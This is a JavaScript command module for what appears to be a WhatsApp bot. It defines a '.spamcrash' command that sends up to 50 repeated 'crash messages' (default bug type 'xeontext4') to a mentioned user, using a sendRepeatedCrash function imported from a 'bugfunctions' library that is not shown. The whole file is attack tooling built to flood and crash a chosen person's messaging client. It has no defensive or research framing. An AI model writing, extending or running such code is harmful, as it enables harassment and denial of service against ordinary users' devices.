const { sendRepeatedCrash } = require('../lib/bugfunctions')

async function spamcrashCommand(sock, chatId, message) {
  try {
    const rawText = message.message?.conversation || 
                   message.message?.extendedTextMessage?.text || ""
    const parts = rawText.trim().split(/\s+/)
    
    // Get mentioned users
    const mentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
    
    if (mentionedJid.length === 0) {
      await sock.sendMessage(chatId, {
        text: '❌ Usage: .spamcrash <count> @user\nExample: .spamcrash 5 @user'
      }, { quoted: message })
      return
    }
    
    const target = mentionedJid[0]
    const count = parseInt(parts[1]) || 5
    const bugType = parts[2] || 'xeontext4'
    
    if (count > 50) {
      await sock.sendMessage(chatId, {
        text: '❌ Maximum 50 messages allowed'
      }, { quoted: message })
      return
    }
    
    await sock.sendMessage(chatId, {
      text: `⏳ Spamming ${count} crash messages...`
    }, { quoted: message })
    
    await sendRepeatedCrash(sock, target, count, bugType)
    
    await sock.sendMessage(chatId, {
      text: `✅ Spam crash sent (${count} messages)!`
    }, { quoted: message })
    
  } catch (error) {
    console.error('Spam Crash Command Error:', error.message)
    await sock.sendMessage(chatId, {
      text: `❌ Error: ${error.message}`
    }, { quoted: message }).catch(() => {})
  }
}

module.exports = spamcrashCommand;
